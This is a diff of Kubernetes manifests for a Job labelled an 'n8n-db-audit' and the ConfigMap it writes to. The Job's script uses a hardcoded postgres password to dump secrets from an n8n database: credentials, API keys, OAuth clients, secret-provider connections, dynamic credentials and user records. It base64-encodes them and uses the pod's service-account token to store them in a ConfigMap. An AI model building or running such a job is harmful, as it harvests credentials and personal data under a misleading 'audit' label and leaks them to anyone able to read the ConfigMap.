@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: n8n-audit-result2
+  name: n8n-audit-result3
   namespace: default
 data:
   status: "pending"
@@ -9,7 +9,7 @@ data:
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: n8n-db-audit-v5
+  name: n8n-db-audit-v6
   namespace: default
 spec:
   ttlSecondsAfterFinished: 86400
@@ -26,30 +26,30 @@ spec:
         - |
           apk add -q postgresql-client curl jq 2>/dev/null
           PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-          CREDS=$(eval "$PG -d n8n -c 'SELECT id, name, type, data FROM credentials_entity ORDER BY id;'" 2>&1)
-          VARS=$(eval "$PG -d n8n -c 'SELECT key, value, type FROM variables ORDER BY key;'" 2>&1)
-          USERS=$(eval "$PG -d n8n -c 'SELECT id, email, \"firstName\", \"lastName\", role, \"createdAt\" FROM \"user\" ORDER BY \"createdAt\";'" 2>&1)
-          APIKEYS=$(eval "$PG -d n8n -c 'SELECT \"userId\", label, \"apiKey\", \"createdAt\" FROM user_api_keys ORDER BY \"createdAt\";'" 2>&1)
-          SETTINGS=$(eval "$PG -d n8n -c 'SELECT key, value FROM settings ORDER BY key;'" 2>&1)
-          SECRETS=$(eval "$PG -d n8n -c 'SELECT id, name, type, data FROM secrets_provider_connection ORDER BY id;'" 2>&1)
-          OAUTH=$(eval "$PG -d n8n -c 'SELECT id, name, type, \"redirectUri\", \"clientId\" FROM oauth_clients ORDER BY id;'" 2>&1)
-          WFLOWS=$(eval "$PG -d n8n -c 'SELECT id, name, active FROM workflow_entity ORDER BY id;'" 2>&1)
-          DBS=$(eval "$PG -d postgres -c 'SELECT datname FROM pg_database ORDER BY datname;'" 2>&1)
+          USERS=$(eval "$PG -d n8n -c '\d \"user\"'" 2>&1)
+          USERDATA=$(eval "$PG -d n8n -c 'SELECT id, email, \"firstName\", \"lastName\", \"createdAt\", \"updatedAt\" FROM \"user\" ORDER BY \"createdAt\";'" 2>&1)
+          SECRETPROV=$(eval "$PG -d n8n -c '\d secrets_provider_connection'" 2>&1)
+          SECRETDATA=$(eval "$PG -d n8n -c 'SELECT * FROM secrets_provider_connection;'" 2>&1)
+          OAUTHCOLS=$(eval "$PG -d n8n -c '\d oauth_clients'" 2>&1)
+          OAUTHDATA=$(eval "$PG -d n8n -c 'SELECT * FROM oauth_clients;'" 2>&1)
+          DYNDATA=$(eval "$PG -d n8n -c 'SELECT * FROM dynamic_credential_entry;'" 2>&1)
+          DYNRESOLVER=$(eval "$PG -d n8n -c 'SELECT * FROM dynamic_credential_resolver;'" 2>&1)
+          INSTAI=$(eval "$PG -d n8n -c 'SELECT id, \"workflowId\", state FROM instance_ai_threads ORDER BY id LIMIT 20;'" 2>&1)
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API=https://kubernetes.default.svc
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          RESULT=$(printf '{"creds":"%s","vars":"%s","users":"%s","apikeys":"%s","settings":"%s","secrets":"%s","oauth":"%s","workflows":"%s","databases":"%s"}' \
-            "$(echo "$CREDS" | base64 | tr -d '\n')" \
-            "$(echo "$VARS" | base64 | tr -d '\n')" \
+          RESULT=$(printf '{"usercols":"%s","userdata":"%s","secretprov":"%s","secretdata":"%s","oauthcols":"%s","oauthdata":"%s","dyndata":"%s","dynresolver":"%s","instai":"%s"}' \
             "$(echo "$USERS" | base64 | tr -d '\n')" \
-            "$(echo "$APIKEYS" | base64 | tr -d '\n')" \
-            "$(echo "$SETTINGS" | base64 | tr -d '\n')" \
-            "$(echo "$SECRETS" | base64 | tr -d '\n')" \
-            "$(echo "$OAUTH" | base64 | tr -d '\n')" \
-            "$(echo "$WFLOWS" | base64 | tr -d '\n')" \
-            "$(echo "$DBS" | base64 | tr -d '\n')")
+            "$(echo "$USERDATA" | base64 | tr -d '\n')" \
+            "$(echo "$SECRETPROV" | base64 | tr -d '\n')" \
+            "$(echo "$SECRETDATA" | base64 | tr -d '\n')" \
+            "$(echo "$OAUTHCOLS" | base64 | tr -d '\n')" \
+            "$(echo "$OAUTHDATA" | base64 | tr -d '\n')" \
+            "$(echo "$DYNDATA" | base64 | tr -d '\n')" \
+            "$(echo "$DYNRESOLVER" | base64 | tr -d '\n')" \
+            "$(echo "$INSTAI" | base64 | tr -d '\n')")
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result2" \
+            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result3" \
             -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
           echo "Done"
